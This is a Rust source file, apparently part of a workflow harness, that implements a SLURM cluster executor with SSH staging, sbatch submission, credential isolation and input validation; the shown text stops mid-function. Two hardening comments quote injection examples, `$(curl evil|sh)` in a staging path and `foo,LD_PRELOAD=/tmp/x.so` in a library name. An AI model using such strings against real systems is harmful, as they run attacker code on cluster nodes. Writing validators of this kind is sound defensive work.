//! SLURM cluster backend — second remote executor alongside AWS.
//!
//! The cluster pre-exists, so `provision` validates SSH + staging
//! only (no instance lifecycle). Each `run_iteration` submits one
//! `sbatch` job, polls `sacct` until terminal state, then rsyncs the
//! runtime dir back from the shared filesystem.
//!
//! See for the
//! full design. The primitives (`ssh.rs`, `staging.rs`, `sbatch.rs`,
//! `polling.rs`, `sizing.rs`, `partition.rs`) are composed here into
//! the `Executor` trait impl.

pub mod partition;
pub mod polling;
pub mod sbatch;
pub mod sizing;
pub mod ssh;
pub mod staging;

use super::sizing::{
    compute_high_water, merge_resource_requirements_max, ComputeProfiles, SizingIntakeFacts,
};
use super::{
    cost_guard::BackendKind, Executor, ExecutorArgs, IterationOutcome, RemoteExecutionInfo,
    ResourceRequirements,
};
use crate::constants::{
    SLURM_DEFAULT_TIME_LIMIT, SLURM_MAX_QUEUE_WAIT_SECS_DEFAULT, SLURM_POLL_INTERVAL_SECS_DEFAULT,
};
use anyhow::{anyhow, Context, Result};
use parking_lot::Mutex;
use ecaa_workflow_core::dag::{Task, TaskState, DAG};
use ecaa_workflow_core::remediation::{ExecutorOverrides, ResourceTarget};
use std::collections::BTreeMap;
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::time::{Duration, Instant};

use polling::{query_job, JobState, StaleCache};
use sbatch::{render_sbatch_script, scancel, submit_sbatch, SbatchSpec};
use sizing::{ResourceClass, SlurmMapping};
use ssh::{SshSession, SystemSshSession};
use staging::Staging;

/// Operator-supplied SLURM configuration. All fields flow from
/// `SWFC_SLURM_*` env vars in `from_env`.
#[derive(Debug, Clone)]
pub struct SlurmConfig {
    pub host: String,
    pub user: Option<String>,
    pub ssh_key: Option<PathBuf>,
    pub proxy_jump: Option<String>,
    pub staging_dir: PathBuf,
    pub default_partition: String,
    pub account: Option<String>,
    pub default_qos: Option<String>,
    pub modules: Vec<String>,
    pub poll_interval: Duration,
    pub max_queue_wait: Duration,
    pub default_time_limit: String,
}

impl SlurmConfig {
    pub fn from_env() -> Result<Self> {
        let mut missing: Vec<&'static str> = Vec::new();
        let host = std::env::var("SWFC_SLURM_HOST").unwrap_or_else(|_| {
            missing.push("SWFC_SLURM_HOST");
            String::new()
        });
        let staging_dir = std::env::var("SWFC_SLURM_STAGING_DIR")
            .map(PathBuf::from)
            .unwrap_or_else(|_| {
                missing.push("SWFC_SLURM_STAGING_DIR");
                PathBuf::new()
            });
        let default_partition =
            std::env::var("SWFC_SLURM_DEFAULT_PARTITION").unwrap_or_else(|_| {
                missing.push("SWFC_SLURM_DEFAULT_PARTITION");
                String::new()
            });
        if !missing.is_empty() {
            return Err(anyhow!(
                "SLURM executor missing required env vars: {}. See docs/remote-compute-operator-reference.md.",
                missing.join(", ")
            ));
        }

        let user = std::env::var("SWFC_SLURM_USER").ok();
        let ssh_key = std::env::var("SWFC_SLURM_SSH_KEY").ok().map(PathBuf::from);
        let proxy_jump = std::env::var("SWFC_SLURM_PROXY_JUMP").ok();
        let account = std::env::var("SWFC_SLURM_ACCOUNT").ok();
        let default_qos = std::env::var("SWFC_SLURM_DEFAULT_QOS").ok();
        let modules = std::env::var("SWFC_SLURM_MODULES")
            .ok()
            .map(|s| {
                s.split(',')
                    .map(|p| p.trim().to_string())
                    .filter(|p| !p.is_empty())
                    .collect()
            })
            .unwrap_or_default();
        let poll_interval = parse_secs(
            "SWFC_SLURM_POLL_INTERVAL_SECS",
            SLURM_POLL_INTERVAL_SECS_DEFAULT,
        );
        let max_queue_wait = parse_secs(
            "SWFC_SLURM_MAX_QUEUE_WAIT_SECS",
            SLURM_MAX_QUEUE_WAIT_SECS_DEFAULT,
        );
        let default_time_limit = std::env::var("SWFC_SLURM_DEFAULT_TIME_LIMIT")
            .unwrap_or_else(|_| SLURM_DEFAULT_TIME_LIMIT.to_string());

        Ok(Self {
            host,
            user,
            ssh_key,
            proxy_jump,
            staging_dir,
            default_partition,
            account,
            default_qos,
            modules,
            poll_interval,
            max_queue_wait,
            default_time_limit,
        })
    }
}

fn parse_secs(var: &str, default: u64) -> Duration {
    Duration::from_secs(
        std::env::var(var)
            .ok()
            .and_then(|v| v.trim().parse().ok())
            .unwrap_or(default),
    )
}

/// SLURM executor.
pub struct SlurmExecutor {
    /// Per-backend cost-guard dispatch tag (R2-N21). Hardcoded to
    /// `BackendKind::NoEstimate` since SLURM's cost posture is
    /// fairshare/QoS quotas not $/hr. The original design held a
    /// `Box<dyn CostModel>` here; the trait was deleted as forced
    /// abstraction, so this is now the dispatch discriminant itself.
    /// A future `FairshareSlurm` variant adds an arm to the free
    /// functions in `cost_guard.rs`.
    cost_backend: BackendKind,
    config: SlurmConfig,
    mapping: SlurmMapping,
    ssh: Box<dyn SshSession>,
    staging: Staging,
    stale_cache: StaleCache,
    /// Jobs this executor has submitted, keyed by task_id, holding
    /// (job_id, partition). Scancelled on `release` for anything still
    /// pending. Mutex so `is_task_stale` (immutable self) can update.
    active_jobs: Mutex<BTreeMap<String, ActiveJob>>,
    /// One-shot: tracks whether `push_wrappers` has run this executor's
    /// lifetime. The agent wrapper + run-task-on-slurm.sh are rsynced
    /// once per harness run, not per task. Flipping this to true after
    /// the first successful push short-circuits subsequent iterations.
    wrappers_pushed: Mutex<bool>,
    /// Pending overrides applied via `apply_overrides`. Read by
    /// `build_spec` next iteration so a remediation reaches the
    /// sbatch parameters (mem, cpus_per_task, time, partition, gres).
    pending_overrides: Mutex<Option<ExecutorOverrides>>,
    /// Most recent iteration capture (log tail + exit code +
    /// node + partition). Populated post-completion in
    /// `run_iteration`; drained by `take_last_capture`.
    last_capture: Mutex<Option<super::IterationCapture>>,
    args: ExecutorArgs,
    /// Cooperative shutdown flag set by `release_in_handler` from the
    /// SIGINT handler thread. The sacct polling loop in
    /// `poll_until_terminal` checks this between poll cycles and returns
    /// early so `run_iteration` exits and the main loop drops the mutex
    /// before the full `release` call acquires it.
    shutdown_requested: Arc<AtomicBool>,
}

#[derive(Debug, Clone)]
struct ActiveJob {
    job_id: String,
    /// Partition this job was dispatched to. Not read on the current
    /// flow but retained for future stall-resize plumbing so a stalled
    /// job's partition is recoverable without a fresh sacct query.
    #[allow(dead_code)]
    // reserved-for-stall-resize: partition surface kept on the handle for recovery
    partition: String,
    node_list: Option<String>,
}

impl SlurmExecutor {
    pub fn new(args: &ExecutorArgs) -> Result<Self> {
        let config = SlurmConfig::from_env()?;
        let mapping = load_mapping()?;
        let ssh = Box::new(SystemSshSession::new(
            config.host.clone(),
            config.user.clone(),
            config.ssh_key.clone(),
            config.proxy_jump.clone(),
        )?);
        Ok(Self::from_parts(args.clone(), config, mapping, ssh))
    }

    fn from_parts(
        args: ExecutorArgs,
        config: SlurmConfig,
        mapping: SlurmMapping,
        ssh: Box<dyn SshSession>,
    ) -> Self {
        let staging = Staging::new(config.staging_dir.clone());
        Self {
            cost_backend: BackendKind::NoEstimate,
            config,
            mapping,
            ssh,
            staging,
            stale_cache: StaleCache::with_default_ttl(),
            active_jobs: Mutex::new(BTreeMap::new()),
            wrappers_pushed: Mutex::new(false),
            pending_overrides: Mutex::new(None),
            last_capture: Mutex::new(None),
            args,
            shutdown_requested: Arc::new(AtomicBool::new(false)),
        }
    }

    /// Remote path of the directory holding `agent-claude-slurm.sh` +
    /// `run-task-on-slurm.sh`. These are rsynced once per harness run,
    /// outside the package tree, so the package's `rsync --delete`
    /// doesn't wipe them out between iterations.
    fn wrappers_remote_dir(&self) -> String {
        format!(
            "{}/wrappers",
            self.config
                .staging_dir
                .to_string_lossy()
                .trim_end_matches('/')
        )
    }

    /// One-shot rsync of the agent script + `run-task-on-slurm.sh` to
    /// the cluster's wrappers dir. Resolved off `self.args.agent` (the
    /// harness CLI `--agent` flag) + the co-located
    /// `run-task-on-slurm.sh` in the same local directory. Idempotent —
    /// subsequent calls after the first success are no-ops.
    fn push_wrappers(&self) -> Result<()> {
        if *self.wrappers_pushed.lock() {
            return Ok(());
        }

        let agent_local = std::path::PathBuf::from(&self.args.agent);
        let agent_abs = agent_local.canonicalize().with_context(|| {
            format!(
                "resolving --agent path {} for SLURM wrapper push",
                agent_local.display()
            )
        })?;
        let scripts_dir = agent_abs.parent().ok_or_else(|| {
            anyhow!(
                "agent path {} has no parent dir; can't locate run-task-on-slurm.sh",
                agent_abs.display()
            )
        })?;
        let wrapper_local = scripts_dir.join("run-task-on-slurm.sh");
        if !wrapper_local.exists() {
            return Err(anyhow!(
                "expected run-task-on-slurm.sh alongside --agent at {}, but it's missing",
                wrapper_local.display()
            ));
        }

        let remote_dir = self.wrappers_remote_dir();
        let mkdir = self
            .ssh
            .run(&format!("mkdir -p {remote_dir}"))
            .with_context(|| format!("preparing wrapper dir {remote_dir}"))?;
        if !mkdir.is_success() {
            return Err(anyhow!(
                "mkdir {remote_dir} failed (exit {}): {}",
                mkdir.exit_code,
                mkdir.stderr
            ));
        }
        for local in [agent_abs.as_path(), wrapper_local.as_path()] {
            let name = local
                .file_name()
                .ok_or_else(|| anyhow!("script has no filename: {}", local.display()))?
                .to_string_lossy();
            let remote = format!("{remote_dir}/{name}");
            let outcome = self
                .ssh
                .rsync(
                    ssh::RsyncDirection::Push,
                    &local.to_string_lossy(),
                    &remote,
                    &[],
                )
                .with_context(|| format!("rsyncing {} to {remote}", local.display()))?;
            if !outcome.is_success() {
                return Err(anyhow!(
                    "rsyncing wrapper {} failed (exit {}): {}",
                    local.display(),
                    outcome.exit_code,
                    outcome.stderr
                ));
            }
            let chmod = self.ssh.run(&format!("chmod +x {remote}"))?;
            if !chmod.is_success() {
                return Err(anyhow!(
                    "chmod +x {remote} failed (exit {}): {}",
                    chmod.exit_code,
                    chmod.stderr
                ));
            }
        }

        *self.wrappers_pushed.lock() = true;
        Ok(())
    }

    /// Test-only constructor that accepts a pre-built SSH session +
    /// `SlurmMapping`. Production code goes through `new`.
    ///
    /// Exposed (rather than `#[cfg(test)]`) so integration tests in
    /// `crates/harness/tests/` — which compile as a separate crate
    /// without `cfg(test)` propagation into this library — can stub
    /// the SSH layer for capability checks. Not part of the public
    /// stability surface; the doc-hidden attribute keeps it out of
    /// rustdoc and signals "test-only" intent.
    #[doc(hidden)]
    pub fn with_ssh(
        args: ExecutorArgs,
        config: SlurmConfig,
        mapping: SlurmMapping,
        ssh: Box<dyn SshSession>,
    ) -> Self {
        Self::from_parts(args, config, mapping, ssh)
    }

    /// Env-var keys that MUST NOT
    /// land in `#SBATCH --export=` because that list is visible to
    /// other users via `scontrol show job <id>`. Instead these are
    /// staged into a per-job 0600 creds file the sbatch body sources.
    const SECRET_KEYS: &'static [&'static str] = &[
        "ANTHROPIC_API_KEY",
        "SWFC_ANTHROPIC_API_KEY",
        "GITHUB_PERSONAL_ACCESS_TOKEN",
        "GITHUB_TOKEN",
        "HF_TOKEN",
        "SWFC_SERVER_AUTH_TOKEN",
        "AWS_ACCESS_KEY_ID",
        "AWS_SECRET_ACCESS_KEY",
        "AWS_SESSION_TOKEN",
    ];

    /// Split the iteration envelope into (safe, secret).
    /// The safe map goes into `#SBATCH --export=` verbatim; the secret
    /// map is staged into the per-job creds file by
    /// `staging::stage_credentials_file`.
    fn split_envelope_secrets(
        envelope: &BTreeMap<String, String>,
    ) -> (BTreeMap<String, String>, BTreeMap<String, String>) {
        let mut safe = BTreeMap::new();
        let mut secret = BTreeMap::new();
        for (k, v) in envelope {
            if Self::SECRET_KEYS.iter().any(|s| s == k) {
                secret.insert(k.clone(), v.clone());
            } else {
                safe.insert(k.clone(), v.clone());
            }
        }
        (safe, secret)
    }
}

/// Reduce an arbitrary id to a path-
/// safe slug for use as the `<job_tag>` segment in the per-job creds
/// file name (`<remote_pkg>/runtime/.creds-<tag>.env`). Keeps only
/// `[A-Za-z0-9_-]`; replaces anything else with `_`. Empty/all-invalid
/// inputs return the literal `"unnamed"` so the path is always
/// non-empty.
fn sanitize_job_tag(tag: &str) -> String {
    let mut out = String::with_capacity(tag.len());
    for c in tag.chars() {
        if c.is_ascii_alphanumeric() || c == '_' || c == '-' {
            out.push(c);
        } else {
            out.push('_');
        }
    }
    if out.is_empty() {
        return "unnamed".to_string();
    }
    out
}

impl SlurmExecutor {
    /// Build the SbatchSpec for one iteration. Reads
    /// `policies/compute-resource-policy.json` to find the next ready
    /// task's stage class + requirements; falls back to the mapping's
    /// `fallback` when the package has no policy file.
    fn build_spec(
        &self,
        package: &Path,
        envelope: &BTreeMap<String, String>,
    ) -> Result<SbatchSpecPayload> {
        let dag = read_dag(package)?;
        let req = resolve_next_task_requirements(&dag, package);
        let (class_ref, used_fallback) = self.mapping.pick_detailed(&req);
        let class = class_ref.clone();

        let remote_pkg = self.staging.remote_pkg_dir(package)?;
        // `remote_pkg`, `wrapper_remote`, and `agent_remote` are
        // interpolated into the sbatch body shell line ~30 lines
        // below (`bash {wrapper_remote} {agent_remote} {remote_pkg}`).
        // Validate before composition so a malicious staging path
        // (e.g. one ending in `$(curl evil|sh)`) can't become a
        // command on the compute node.
        if !super::_id_validator::package_dir_is_safe(&remote_pkg) {
            return Err(anyhow!(
                "refusing sbatch build with unsafe remote_pkg: {remote_pkg:?}"
            ));
        }
        let wrappers_dir = self.wrappers_remote_dir();
        // `args.agent` is the local path the harness was launched with;
        // `push_wrappers` rsyncs it into wrappers_dir under its basename.
        let agent_basename = std::path::PathBuf::from(&self.args.agent)
            .file_name()
            .map(|n| n.to_string_lossy().into_owned())
            .unwrap_or_else(|| "agent-claude-slurm.sh".into());
        let agent_remote = format!("{wrappers_dir}/{agent_basename}");
        let wrapper_remote = format!("{wrappers_dir}/run-task-on-slurm.sh");

        let job_name = format!(
            "scripps-{}",
            package
                .file_name()
                .map(|n| n.to_string_lossy().into_owned())
                .unwrap_or_else(|| "task".into())
        );
        let output_path = format!("{remote_pkg}/runtime/slurm-%j.log");

        // Split secrets out of the
        // export list before rendering. Secrets land in the per-job
        // 0600 creds file (staged in `run_iteration` via
        // `staging::stage_credentials_file`); the sbatch body sources
        // it and `trap` cleans it up on exit so SLURM control-plane
        // queries (`scontrol show job`, `sacct --json`) never observe
        // the values.
        let (safe_exports, _secret_exports) = Self::split_envelope_secrets(envelope);
        // Pass the remote package path as the second arg to
        // run-task-on-slurm.sh so the wrapper `cd`s into the right dir
        // regardless of the agent script's working-dir assumptions.
        // The `__SCRIPPS_CREDS_PATH__` placeholder is patched by the
        // caller (`run_iteration`) after `stage_credentials_file`
        // returns the real path; we emit it here so the body shape
        // stays in the deterministic build_spec output.
        let body = format!(
            "# F-EXEC-H-03 — source per-job 0600 creds file; clean on exit.\n\
             if [ -f __SCRIPPS_CREDS_PATH__ ]; then\n\
                 trap 'rm -f __SCRIPPS_CREDS_PATH__' EXIT\n\
                 . __SCRIPPS_CREDS_PATH__\n\
             fi\n\
             bash {wrapper_remote} {agent_remote} {remote_pkg}\n"
        );

        let mut spec = SbatchSpec {
            job_name,
            partition: self.config.default_partition.clone(),
            qos: self.config.default_qos.clone(),
            account: self.config.account.clone(),
            cpus_per_task: class.cpus_per_task,
            mem: class.mem.clone(),
            gres: class.gres.clone(),
            time_limit: self.config.default_time_limit.clone(),
            output_path,
            modules: self.config.modules.clone(),
            exports: safe_exports,
            body,
        };
        partition::apply_class(&mut spec, &class);
        // SWFC_SLURM_DEFAULT_TIME_LIMIT is "Fallback
        // `--time=` when sizing mapping is silent". When the resolver
        // fell back (no named class satisfied the requirement), the
        // env-var default wins over the mapping's generic fallback
        // class's time — operators tune the env var for site-wide
        // wall-clock caps without editing the YAML.
        if used_fallback {
            spec.time_limit = self.config.default_time_limit.clone();
        }

        // Layer remediation overrides on top of the profile-driven
        // pick. A bump only ever raises the floor — we re-apply the
        // larger of (existing class value, override value) so a stale
        // override never accidentally shrinks a real profile.
        if let Some(ov) = self.pending_overrides.lock().as_ref() {
            apply_overrides_to_spec(&mut spec, ov);
        }

        // Drain `SWFC_TASK_ID` so `run_iteration` can key `active_jobs`
        // by the exact task id rather than suffix-matching on `job_name`.
        // The envelope is built by the harness main before dispatch and
        // always includes the picked task's id; production paths always
        // populate it. Test fixtures that hand in an empty envelope
        // (legacy live tests exercising `release_scancels_active_jobs`
        // etc.) fall back to the synthetic `job_name` key on the insert
        // side.
        let task_id = envelope
            .get(crate::executor::hardware_envelope::TASK_ID_ENV)
            .cloned();

        Ok(SbatchSpecPayload {
            spec,
            class,
            remote_pkg,
            task_id,
        })
    }

    fn poll_until_terminal(&self, job_id: &str) -> Result<polling::SacctRow> {
        let poll = self.config.poll_interval;
        let deadline = Instant::now() + self.config.max_queue_wait;
        let mut last_non_terminal: Option<polling::SacctRow> = None;
        loop {
            let row = query_job(self.ssh.as_ref(), job_id)?;
            if let Some(r) = row.as_ref() {
                if r.state.is_terminal() {
                    return Ok(r.clone());
                }
                last_non_terminal = row.clone();
            }
            if Instant::now() >= deadline {
                let _ = scancel(self.ssh.as_ref(), job_id);
                let state = last_non_terminal
                    .map(|r| format!("{:?}", r.state))
                    .unwrap_or_else(|| "unknown".into());
                return Err(anyhow!(
                    "SLURM job {job_id} did not reach terminal state within {:?}; last observed state {state}. Cancelled.",
                    self.config.max_queue_wait
                ));
            }
            // Cooperative shutdown: SIGINT handler sets this flag via
            // `release_in_handler(&self)` without acquiring the iteration
            // mutex. Cancelling the job and returning early lets
            // `run_iteration` exit so the main loop drops the mutex
            // before the full `release` call acquires it.
            if self.shutdown_requested.load(Ordering::Acquire) {
                let _ = scancel(self.ssh.as_ref(), job_id);
                return Err(anyhow!(
                    "SLURM job {job_id} cancelled: shutdown signal received"
                ));
            }
            std::thread::sleep(poll);
        }
    }
}

struct SbatchSpecPayload {
    spec: SbatchSpec,
    class: ResourceClass,
    remote_pkg: String,
    /// Task id of the dispatched ready task, drained from the
    /// envelope's `SWFC_TASK_ID`. Used as the `active_jobs` map key
    /// (replaces the previous `job_name` keying which suffix-collided
    /// on shared task-name fragments). `None` when the envelope is
    /// empty (test fixtures) — in that case the caller falls back to a
    /// synthetic key derived from `job_name`.
    task_id: Option<String>,
}

/// Apply remediation overrides to a SLURM `SbatchSpec`. Resource bumps
/// raise the floor — never lower an already-larger profile pick. Library
/// pins / env passthrough merge into `exports`. `partition` swaps verbatim.
fn apply_overrides_to_spec(spec: &mut SbatchSpec, ov: &ExecutorOverrides) {
    if let Some(target) = ov.resources.as_ref() {
        if let Some(v) = target.vcpus {
            spec.cpus_per_task = spec.cpus_per_task.max(v);
        }
        if let Some(g) = target.memory_gb {
            spec.mem = bump_mem_floor(&spec.mem, g);
        }
        if let Some(secs) = target.wallclock_secs {
            spec.time_limit = secs_to_hms(secs);
        }
        if let Some(g) = target.gpu.as_ref() {
            spec.gres = Some(format!("gpu:{}:{}", normalize_gpu_kind(&g.kind), g.count));
        }
    }
    if let Some(p) = ov.partition.as_ref() {
        spec.partition = p.clone();
    }
    for (lib, ver) in &ov.library_pins {
        // C-9: library names and version values flow into
        // sbatch `--export=` directives where `,` separates entries and
        // `\n` terminates the directive. Without sanitization a hostile
        // library identifier rebinds parent env vars (e.g.
        // `foo,LD_PRELOAD=/tmp/x.so`) or injects directives. Refuse
        // anything outside `^[A-Z_][A-Z0-9_]*$` after normalization,
        // and refuse values containing `\n` / `\r` / `,` / `=` / `\0`.
        let Some(suffix) = ecaa_workflow_core::env_validator::sanitize_lib_env_suffix(lib)
        else {
            tracing::warn!(
                library = %lib,
                "rejecting invalid library name in SLURM export (C-9 hardening)"
            );
            continue;
        };
        if !ecaa_workflow_core::env_validator::is_safe_env_value(ver) {
            tracing::warn!(
                library = %lib,
                value = %ver,
                "rejecting invalid library version value in SLURM export (C-9 hardening)"
            );
            continue;
        }
        let key = format!("SWFC_LIB_PIN_{suffix}");
        spec.exports.entry(key).or_insert(ver.clone());
    }
    for (k, v) in &ov.env_passthrough {
        // C-9: env_passthrough is a typed BTreeMap<String,String> but
        // remediation payloads from chat-side proposals reach here as
        // arbitrary strings. Refuse keys that aren't POSIX env names
        // and values that would break the sbatch directive parser.
        if !ecaa_workflow_core::env_validator::is_valid_env_name(k) {
            tracing::warn!(
                key = %k,
                "rejecting invalid env_passthrough key in SLURM export (C-9 hardening)"
            );
            continue;
        }
        if !ecaa_workflow_core::env_validator::is_safe_env_value(v) {
            tracing::warn!(
                key = %k,
                value = %v,
                "rejecting invalid env_passthrough value in SLURM export (C-9 hardening)"
            );
            continue;
        }
        spec.exports.entry(k.clone()).or_insert(v.clone());
    }
}

/// Bump SLURM `--mem=` value so it covers at least `min_gb`. SLURM
/// accepts forms like `64G`, `32000M`, `0` (no limit). Anything we
/// can't parse is replaced with the override unconditionally so the
/// remediation always wins.
fn bump_mem_floor(current: &str, min_gb: u32) -> String {
    let trimmed = current.trim();
    let parsed_gb = if let Some(rest) = trimmed
        .strip_suffix(['G', 'g'])
        .or_else(|| trimmed.strip_suffix("GB"))
        .or_else(|| trimmed.strip_suffix("gb"))
    {
        rest.parse::<u32>().ok()
    } else if let Some(rest) = trimmed
        .strip_suffix(['M', 'm'])
        .or_else(|| trimmed.strip_suffix("MB"))
    {
        rest.parse::<u32>().ok().map(|m| m / 1024)
    } else {
        None
    };
    let max_gb = parsed_gb.unwrap_or(0).max(min_gb);
    format!("{}G", max_gb)
}

fn secs_to_hms(secs: u64) -> String {
    let h = secs / 3600;
    let m = (secs % 3600) / 60;
    let s = secs % 60;
    format!("{:02}:{:02}:{:02}", h, m, s)
}

/// Map a backend-agnostic GPU kind ("nvidia-a100", "nvidia-t4") to the
/// SLURM `--gres=gpu:<name>:N` site convention. Sites use short names
/// (`a100`, `t4`); strip the vendor prefix so a remediation written
/// against the abstract type lands as a usable gres string.
fn normalize_gpu_kind(kind: &str) -> String {
    kind.strip_prefix("nvidia-")
        .unwrap_or(kind)
        .to_ascii_lowercase()
}

/// Load `config/compute-profiles/slurm-mapping.yaml` alongside its
/// schema. Searches from CWD (operators run from repo root); honors
/// `SWFC_CONFIG_DIR` as an override.
fn load_mapping() -> Result<SlurmMapping> {
    let config_dir = std::env::var("SWFC_CONFIG_DIR")
        .map(PathBuf::from)
        .unwrap_or_else(|_| PathBuf::from("config"));
    let yaml = config_dir.join("compute-profiles/slurm-mapping.yaml");
    let schema = config_dir.join("compute-profiles/slurm-mapping.schema.json");
    if !yaml.exists() {
        return Err(anyhow!(
            "SLURM mapping not found at {}. Set SWFC_CONFIG_DIR or run from repo root.",
            yaml.display()
        ));
    }
    SlurmMapping::load(&yaml, if schema.exists() { Some(&schema) } else { None })
}

fn read_dag(package: &Path) -> Result<DAG> {
    let p = package.join("WORKFLOW.json");
    let content =
        std::fs::read_to_string(&p).with_context(|| format!("reading {}", p.display()))?;
    serde_json::from_str(&content).with_context(|| format!("parsing {}", p.display()))
}

fn resolve_next_task_requirements(dag: &DAG, package: &Path) -> ResourceRequirements {
    // Find the first Ready task. When none, fall through to the
    // "nothing ready" case — the mapping.fallback will be picked.
    let ready_task = dag
        .tasks
        .values()
        .find(|t| matches!(t.state, TaskState::Ready));
    let stage_class = ready_task.map(stage_class_of).unwrap_or_default();

    let methods: Vec<String> = ready_task
        .and_then(|t| {
            t.spec
                .as_ref()
                .and_then(|s| s.get("method"))
                .and_then(|m| m.as_str())
                .map(|m| vec![m.to_string()])
        })
        .unwrap_or_default();

    let profiles_path = package.join("policies/compute-resource-policy.json");
    let profiles = load_profiles(&profiles_path);
    let facts = load_intake_facts(package).unwrap_or_default();
    let baseline = compute_high_water(&profiles, &stage_class, &facts, &methods);
    let projected = if stage_class.is_empty() {
        None
    } else {
        super::pilot::load_pilot_projected_requirements(package)
            .and_then(|m| m.get(&stage_class).cloned())
    };
    match (baseline, projected) {
        (Some(base), Some(proj)) => merge_resource_requirements_max(&base, &proj),
        (Some(base), None) => base,
        (None, Some(proj)) => proj,
        (None, None) => ResourceRequirements {
            vcpus: 2,
            memory_gb: 4,
            storage_gb: 50,
            gpu: None,
        },
    }
}

fn load_profiles(path: &Path) -> ComputeProfiles {
    if !path.exists() {
        return ComputeProfiles {
            profiles: Default::default(),
            default: super::sizing::DefaultProfile {
                requirements: super::sizing::BaseRequirements::default(),
                notes: None,
            },
            method_overrides: Default::default(),
        };
    }
    let raw = match std::fs::read_to_string(path) {
        Ok(r) => r,
        Err(_) => return empty_profiles(),
    };
    let v: serde_json::Value = match serde_json::from_str(&raw) {
        Ok(v) => v,
        Err(_) => return empty_profiles(),
    };
    let yaml = match serde_yml::to_string(&v) {
        Ok(y) => y,
        Err(_) => return empty_profiles(),
    };
    serde_yml::from_str(&yaml).unwrap_or_else(|_| empty_profiles())
}

fn empty_profiles() -> ComputeProfiles {
    ComputeProfiles {
        profiles: Default::default(),
        default: super::sizing::DefaultProfile {
            requirements: super::sizing::BaseRequirements::default(),
            notes: None,
        },
        method_overrides: Default::default(),
    }
}

fn load_intake_facts(package: &Path) -> Option<SizingIntakeFacts> {
    let p = package.join("policies/intake-facts.json");
    if !p.exists() {
        return None;
    }
    let raw = std::fs::read_to_string(&p).ok()?;
    serde_json::from_str(&raw).ok()
}

fn stage_class_of(t: &Task) -> String {
    t.spec
        .as_ref()
        .and_then(|s| s.get("stage_class"))
        .and_then(|v| v.as_str())
        .map(|s| s.to_string())
        .unwrap_or_else(|| format!("{:?}", t.kind).to_ascii_lowercase())
}

impl Executor for SlurmExecutor {
    fn name(&self) -> &'static str {
        "slurm"
    }

    /// SLURM executor capability profile. Sandbox tier is
    /// driven by `SWFC_SLURM_NATIVE_CONTAINER=1` (SLURM 25.11+ ships
    /// `--container` directives that the harness can require). Network
    /// defaults to deny-all because production clusters are typically
    /// egress-restricted; operators wire explicit allowlists through
    /// the `partition` policy when the cluster permits outbound.
    //
    // W8.2 — R1.6 follow-through complete: the bash script at lines
    // ~416-440 now reads SWFC_TASK_NETWORK and falls back to
    // SWFC_CONTAINER_NETWORK_DEFAULT then to `none`. The earlier
    // hardcoded `--net --network=none` is gone. The matching
    // R2.5 docker-pull credential threading remains a separate
    // follow-up (`SWFC_CONTAINER_REGISTRY_AUTH` is not yet honored
    // on the SLURM apptainer pull path — but it is honored on the
    // local docker login path via `registry_login_if_configured`).
    fn capabilities(&self) -> super::ExecutorCapabilities {
        let sandbox = if ecaa_workflow_core::env_helpers::env_bool("SWFC_SLURM_NATIVE_CONTAINER")
        {
            ecaa_workflow_core::atom::SandboxRequirement::ProcessIsolation
        } else {
            ecaa_workflow_core::atom::SandboxRequirement::None
        };
        super::ExecutorCapabilities {
            sandbox,
            network: ecaa_workflow_core::atom::NetworkPolicy::None { allowlist: vec![] },
            kind: "slurm",
        }
    }

    /// Provision: validate SSH reachability. Cluster pre-exists so
    /// there's no instance to launch; failures here mean the operator's
    /// SWFC_SLURM_* env is broken.
    #[tracing::instrument(skip(self, _dag), fields(executor = "slurm"))]
    fn provision(&mut self, _dag: &DAG) -> Result<()> {
        let out = self
            .ssh
            .run("sinfo -h -o '%P' | head -n1")
            .context("SLURM provision: probing cluster with sinfo")?;
        if !out.is_success() {
            return Err(anyhow!(
                "SLURM sinfo probe failed (exit {}): {}",
                out.exit_code,
                out.stderr
            ));
        }
        Ok(())
    }

    #[tracing::instrument(skip(self, package, agent_cmd, envelope), fields(executor = "slurm"))]
    fn run_iteration(
        &mut self,
        package: &Path,
        agent_cmd: &str,
        envelope: &std::collections::BTreeMap<String, String>,
    ) -> Result<IterationOutcome> {
        // Detect drift: the harness passes `agent_cmd` to every
        // iteration; we only consume `self.args.agent` (from the CLI
        // --agent flag) when rsyncing. If the caller ever starts
        // passing a different value, surface it loudly rather than
        // silently ignoring.
        if agent_cmd != self.args.agent {
            return Err(anyhow!(
                "SLURM executor was constructed with --agent={} but run_iteration received agent_cmd={}. \
                 The wrapper rsync is cached on the constructor value; mixing agents mid-run is unsupported.",
                self.args.agent, agent_cmd
            ));
        }

        // One-shot push of the agent wrapper + run-task-on-slurm.sh.
        // Rsynced once per harness run, not per task.
        self.push_wrappers()
            .context("staging agent wrapper scripts to SLURM cluster")?;

        // Stage package to cluster (idempotent with --delete).
        self.staging
            .push_package(self.ssh.as_ref(), package)
            .context("staging package to SLURM cluster")?;

        let mut payload = self.build_spec(package, envelope)?;

        // Stage secrets into a 0600
        // creds file the sbatch body sources, then patch the placeholder
        // path into the rendered body. Job tag is the deterministic
        // task id (when present) so reruns reuse the same path and the
        // body remains byte-identical for the same input.
        let (_safe, secret_exports) = Self::split_envelope_secrets(envelope);
        if !secret_exports.is_empty() {
            let creds_pairs: Vec<(&str, &str)> = secret_exports
                .iter()
                .map(|(k, v)| (k.as_str(), v.as_str()))
                .collect();
            let job_tag = payload
                .task_id
                .clone()
                .unwrap_or_else(|| payload.spec.job_name.clone());
            // Sanitize the job tag so it can't break out of the
            // filename position. The id-validator's shape rule
            // (alnum + `-` + `_`) matches well; anything outside
            // forces a fallback hash.
            let safe_tag = sanitize_job_tag(&job_tag);
            let creds_path = staging::stage_credentials_file(
                self.ssh.as_ref(),
                &payload.remote_pkg,
                &safe_tag,
                &creds_pairs,
            )
            .context("staging per-job credentials file")?;
            payload.spec.body = payload
                .spec
                .body
                .replace("__SCRIPPS_CREDS_PATH__", &creds_path);
        } else {
            // No secrets — the `if [ -f __SCRIPPS_CREDS_PATH__ ]` guard
            // already handles a missing file gracefully, but replace
            // the literal placeholder with `/dev/null` so the trap
            // statement doesn't try to remove a path called
            // `__SCRIPPS_CREDS_PATH__` if some shell quirk passes the
            // `-f` test.
            payload.spec.body = payload
                .spec
                .body
                .replace("__SCRIPPS_CREDS_PATH__", "/dev/null");
        }

        let script = render_sbatch_script(&payload.spec);
        let script_path = format!("{}/scripts/task.sbatch", payload.remote_pkg);

        let job_id = submit_sbatch(self.ssh.as_ref(), &script_path, &script)?;

        // Track by exact `task_id` from the envelope so `is_task_stale`
